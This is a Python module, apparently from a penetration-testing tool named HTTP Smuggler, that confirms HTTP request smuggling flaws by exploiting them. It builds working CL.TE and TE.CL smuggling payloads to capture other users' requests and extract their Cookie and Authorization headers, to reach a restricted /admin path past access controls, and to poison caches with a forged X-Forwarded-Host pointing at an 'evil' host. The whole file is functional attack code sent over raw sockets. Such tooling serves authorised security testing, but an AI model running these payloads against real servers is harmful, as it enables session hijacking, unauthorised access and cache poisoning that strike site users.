"""Exploitation runner for HTTP Smuggler.

After detecting a vulnerability, this module attempts to confirm
exploitability through actual exploitation techniques:
- Session/request capture
- ACL bypass verification
- Cache poisoning (with caution)
"""

import asyncio
import time
import re
from typing import Optional, List, Dict, Any, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse

from http_smuggler.core.config import ExploitConfig, NetworkConfig, SafetyConfig
from http_smuggler.core.models import (
    DetectionResult,
    ExploitationResult,
    SmugglingVariant,
)
from http_smuggler.core.exceptions import (
    ExploitationError,
    SessionCaptureError,
    CachePoisoningError,
)
from http_smuggler.network.raw_socket import AsyncRawHttpClient, RawResponse
from http_smuggler.payloads.generator import Payload
from http_smuggler.utils.helpers import parse_url, generate_request_id


@dataclass
class ExploitResult:
    """Detailed result of an exploitation attempt."""
    attempted: bool
    successful: bool
    exploit_type: str
    impact: Optional[str] = None
    captured_data: Optional[str] = None
    steps: List[Dict[str, Any]] = field(default_factory=list)
    error: Optional[str] = None
    
    def to_exploitation_result(self) -> ExploitationResult:
        """Convert to ExploitationResult model."""
        return ExploitationResult(
            attempted=self.attempted,
            successful=self.successful,
            impact=self.impact,
            captured_data=self.captured_data,
            steps=self.steps,
            error=self.error,
        )


class ExploitRunner:
    """Runs exploitation attempts to confirm vulnerabilities."""
    
    def __init__(
        self,
        exploit_config: Optional[ExploitConfig] = None,
        safety_config: Optional[SafetyConfig] = None,
        network_config: Optional[NetworkConfig] = None,
    ):
        self.exploit = exploit_config or ExploitConfig()
        self.safety = safety_config or SafetyConfig()
        self.network = network_config or NetworkConfig()
    
    async def run_exploits(
        self,
        detection: DetectionResult,
        payload: Payload,
        host: str,
        port: int,
        use_ssl: bool,
    ) -> ExploitResult:
        """Run exploitation attempts based on detection result.
        
        Args:
            detection: Positive detection result
            payload: Payload that triggered detection
            host: Target host
            port: Target port
            use_ssl: Whether to use SSL/TLS
        
        Returns:
            ExploitResult with exploitation outcome
        """
        if not self.exploit.enabled:
            return ExploitResult(
                attempted=False,
                successful=False,
                exploit_type="none",
                error="Exploitation disabled in config",
            )
        
        if not detection.vulnerable:
            return ExploitResult(
                attempted=False,
                successful=False,
                exploit_type="none",
                error="No vulnerability detected",
            )
        
        results = []
        
        # Try session capture
        if self.exploit.attempt_session_capture:
            result = await self._attempt_session_capture(
                payload, host, port, use_ssl
            )
            results.append(result)
            if result.successful:
                return result
        
        # Try ACL bypass
        if self.exploit.attempt_acl_bypass:
            result = await self._attempt_acl_bypass(
                payload, host, port, use_ssl
            )
            results.append(result)
            if result.successful:
                return result
        
        # Cache poisoning (disabled by default - potentially impactful)
        if self.exploit.attempt_cache_poisoning:
            result = await self._attempt_cache_poisoning(
                payload, host, port, use_ssl
            )
            results.append(result)
            if result.successful:
                return result
        
        # Return best result
        successful_results = [r for r in results if r.successful]
        if successful_results:
            return successful_results[0]
        
        attempted_results = [r for r in results if r.attempted]
        if attempted_results:
            return attempted_results[0]
        
        return ExploitResult(
            attempted=True,
            successful=False,
            exploit_type="multiple",
            error="All exploitation attempts failed",
        )
    
    async def _attempt_session_capture(
        self,
        payload: Payload,
        host: str,
        port: int,
        use_ssl: bool,
    ) -> ExploitResult:
        """Attempt to capture a session/request.
        
        This smuggles a request that captures the next user's request
        as the body of a POST to a logging endpoint.
        """
        steps = []
        capture_id = generate_request_id()
        
        # Build capture payload
        # This smuggles a POST request that will capture the victim's request
        parsed = parse_url(f"{'https' if use_ssl else 'http'}://{host}")
        
        # Smuggled request that captures next request
        smuggled_capture = (
            f"POST /capture_{capture_id} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 500\r\n"
            f"\r\n"
            f"captured="
        )
        
        # Build complete smuggle payload based on variant
        if payload.variant == SmugglingVariant.CL_TE:
            body = f"0\r\n\r\n{smuggled_capture}"
            capture_payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{body}"
            ).encode()
        elif payload.variant == SmugglingVariant.TE_CL:
            chunk_size = hex(len(smuggled_capture))[2:]
            capture_payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{chunk_size}\r\n{smuggled_capture}0\r\n\r\n"
            ).encode()
        else:
            # Use original payload structure
            capture_payload = payload.raw_request
        
        steps.append({
            "action": "build_capture_payload",
            "capture_id": capture_id,
        })
        
        try:
            async with AsyncRawHttpClient(self.network) as client:
                await client.connect(host, port, use_ssl)
                
                # Send capture payload
                response1 = await client.send_and_receive(
                    capture_payload,
                    receive_timeout=self.exploit.capture_timeout,
                )
                
                steps.append({
                    "action": "send_capture_payload",
                    "status": response1.status_code,
                })
                
                # Wait for potential victim
                await asyncio.sleep(1)
                
                # Send follow-up request to trigger capture
                victim_request = (
                    f"GET /trigger_{capture_id} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Cookie: session=victim_session_12345\r\n"
                    f"\r\n"
                ).encode()
                
                response2 = await client.send_and_receive(
                    victim_request,
                    receive_timeout=self.exploit.capture_timeout,
                )
                
                steps.append({
                    "action": "send_victim_request",
                    "status": response2.status_code,
                })
                
                # Check if capture worked
                # In a real scenario, we'd check if the capture endpoint received data
                captured_data = self._extract_captured_data(response2)
                
                if captured_data:
                    return ExploitResult(
                        attempted=True,
                        successful=True,
                        exploit_type="session_capture",
                        impact="Successfully captured request data - session hijacking possible",
                        captured_data=captured_data,
                        steps=steps,
                    )
                
                # Check for poisoning indicators
                if self._check_poisoning_indicators(response2):
                    return ExploitResult(
                        attempted=True,
                        successful=True,
                        exploit_type="session_capture",
                        impact="Request poisoning confirmed - capture likely possible",
                        steps=steps,
                    )
                
        except Exception as e:
            steps.append({
                "action": "error",
                "message": str(e),
            })
        
        return ExploitResult(
            attempted=True,
            successful=False,
            exploit_type="session_capture",
            steps=steps,
            error="Session capture not confirmed",
        )
    
    async def _attempt_acl_bypass(
        self,
        payload: Payload,
        host: str,
        port: int,
        use_ssl: bool,
    ) -> ExploitResult:
        """Attempt to bypass access controls.
        
        This smuggles a request to a restricted endpoint (/admin)
        to verify ACL bypass is possible.
        """
        steps = []
        
        # Build ACL bypass payload
        smuggled_admin = (
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Smuggled: true\r\n"
            f"\r\n"
        )
        
        if payload.variant == SmugglingVariant.CL_TE:
            body = f"0\r\n\r\n{smuggled_admin}"
            bypass_payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{body}"
            ).encode()
        elif payload.variant == SmugglingVariant.TE_CL:
            chunk_size = hex(len(smuggled_admin))[2:]
            bypass_payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{chunk_size}\r\n{smuggled_admin}0\r\n\r\n"
            ).encode()
        else:
            bypass_payload = payload.raw_request
        
        steps.append({"action": "build_bypass_payload"})
        
        try:
            async with AsyncRawHttpClient(self.network) as client:
                await client.connect(host, port, use_ssl)
                
                # First, check normal access to /admin (should be blocked)
                normal_admin = (
                    f"GET /admin HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"\r\n"
                ).encode()
                
                baseline = await client.send_and_receive(
                    normal_admin,
                    receive_timeout=10,
                )
                
                steps.append({
                    "action": "baseline_admin_check",
                    "status": baseline.status_code,
                })
                
                baseline_blocked = baseline.status_code in [401, 403, 404]
                
                # Reconnect and try smuggle
                await client.close()
                await client.connect(host, port, use_ssl)
                
                # Send bypass payload
                response1 = await client.send_and_receive(
                    bypass_payload,
                    receive_timeout=10,
                )
                
                steps.append({
                    "action": "send_bypass_payload",
                    "status": response1.status_code,
                })
                
                # Send follow-up to get smuggled response
                followup = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"\r\n"
                ).encode()
                
                response2 = await client.send_and_receive(
                    followup,
                    receive_timeout=10,
                )
                
                steps.append({
                    "action": "followup_request",
                    "status": response2.status_code,
                })
                
                # Check if we got admin content
                admin_indicators = [
                    b"admin",
                    b"dashboard",
                    b"management",
                    b"configuration",
                    b"settings",
                ]
                
                response_body = response2.body.lower() if response2.body else b""
                got_admin_content = any(
                    ind in response_body for ind in admin_indicators
                )
                
                # Success if:
                # 1. Baseline was blocked but smuggle got through
                # 2. Or we see admin content in response
                if baseline_blocked and response2.status_code == 200:
                    return ExploitResult(
                        attempted=True,
                        successful=True,
                        exploit_type="acl_bypass",
                        impact="ACL bypass confirmed - accessed restricted endpoint",
                        steps=steps,
                    )
                
                if got_admin_content and baseline_blocked:
                    return ExploitResult(
                        attempted=True,
                        successful=True,
                        exploit_type="acl_bypass",
                        impact="ACL bypass confirmed - admin content retrieved",
                        steps=steps,
                    )
                
        except Exception as e:
            steps.append({
                "action": "error",
                "message": str(e),
            })
        
        return ExploitResult(
            attempted=True,
            successful=False,
            exploit_type="acl_bypass",
            steps=steps,
            error="ACL bypass not confirmed",
        )
    
    async def _attempt_cache_poisoning(
        self,
        payload: Payload,
        host: str,
        port: int,
        use_ssl: bool,
    ) -> ExploitResult:
        """Attempt cache poisoning (USE WITH CAUTION).
        
        This is potentially impactful as it may affect other users.
        Only use in controlled environments with explicit permission.
        """
        steps = []
        
        # Use a unique cache key for testing
        cache_test_id = generate_request_id()
        cache_path = f"/static/test_{cache_test_id}.js"
        
        # Build cache poisoning payload
        smuggled_cache = (
            f"GET {cache_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Forwarded-Host: evil-{cache_test_id}.com\r\n"
            f"\r\n"
        )
        
        if payload.variant == SmugglingVariant.CL_TE:
            body = f"0\r\n\r\n{smuggled_cache}"
            poison_payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{body}"
            ).encode()
        else:
            poison_payload = payload.raw_request
        
        steps.append({
            "action": "build_poison_payload",
            "cache_path": cache_path,
        })
        
        try:
            async with AsyncRawHttpClient(self.network) as client:
                await client.connect(host, port, use_ssl)
                
                # Send poison payload
                response1 = await client.send_and_receive(
                    poison_payload,
                    receive_timeout=10,
                )
                
                steps.append({
                    "action": "send_poison_payload",
                    "status": response1.status_code,
                })
                
                # Wait for cache to be populated
                await asyncio.sleep(0.5)
                
                # Check if cache is poisoned
                await client.close()
                await client.connect(host, port, use_ssl)
                
                cache_check = (
                    f"GET {cache_path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"\r\n"
                ).encode()
                
                response2 = await client.send_and_receive(
                    cache_check,
                    receive_timeout=10,
                )
                
                steps.append({
                    "action": "check_cache",
                    "status": response2.status_code,
                })
                
                # Check for poisoning indicators in cached response
                if response2.body:
                    body_str = response2.body.decode("utf-8", errors="ignore")
                    if f"evil-{cache_test_id}" in body_str:
                        return ExploitResult(
                            attempted=True,
                            successful=True,
                            exploit_type="cache_poisoning",
                            impact="Cache poisoning confirmed - malicious content cached",
                            steps=steps,
                        )
                
        except Exception as e:
            steps.append({
                "action": "error",
                "message": str(e),
            })
        
        return ExploitResult(
            attempted=True,
            successful=False,
            exploit_type="cache_poisoning",
            steps=steps,
            error="Cache poisoning not confirmed",
        )
    
    def _extract_captured_data(self, response: RawResponse) -> Optional[str]:
        """Extract captured request data from response."""
        if not response.body:
            return None
        
        body_str = response.body.decode("utf-8", errors="ignore")
        
        # Look for captured request patterns
        patterns = [
            r"captured=([^\s&]+)",
            r"Cookie:\s*([^\r\n]+)",
            r"Authorization:\s*([^\r\n]+)",
        ]
        
        for pattern in patterns:
            match = re.search(pattern, body_str)
            if match:
                return match.group(1)
        
        return None
    
    def _check_poisoning_indicators(self, response: RawResponse) -> bool:
        """Check if response indicates poisoning occurred."""
        if not response:
            return False
        
        # Wrong status code
        if response.status_code in [404, 400, 405]:
            return True
        
        # Check body for indicators
        if response.body:
            indicators = [
                b"smuggled",
                b"capture",
                b"GPOST",
                b"invalid",
            ]
            body_lower = response.body.lower()
            return any(ind in body_lower for ind in indicators)
        
        return False


async def confirm_vulnerability(
    detection: DetectionResult,
    payload: Payload,
    url: str,
    exploit_config: Optional[ExploitConfig] = None,
) -> ExploitResult:
    """Convenience function to confirm a vulnerability.
    
    Args:
        detection: Positive detection result
        payload: Payload that triggered detection
        url: Target URL
        exploit_config: Optional exploitation config
    
    Returns:
        ExploitResult with confirmation outcome
    """
    parsed = parse_url(url)
    
    runner = ExploitRunner(exploit_config)
    
    return await runner.run_exploits(
        detection,
        payload,
        parsed.host,
        parsed.port,
        parsed.use_ssl,
    )

